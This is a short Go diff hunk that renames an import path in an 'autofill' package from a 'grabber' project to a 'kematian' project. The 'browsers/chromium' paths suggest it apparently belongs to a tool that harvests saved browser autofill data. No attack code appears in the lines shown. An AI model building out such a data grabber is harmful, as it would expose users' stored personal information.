@@ -3,7 +3,7 @@ package autofill
 import (
 	"database/sql"
 	"encoding/json"
-	"kdot/grabber/browsers/chromium/structs"
+	"kdot/kematian/browsers/chromium/structs"
 )
 
 type Autofill struct {
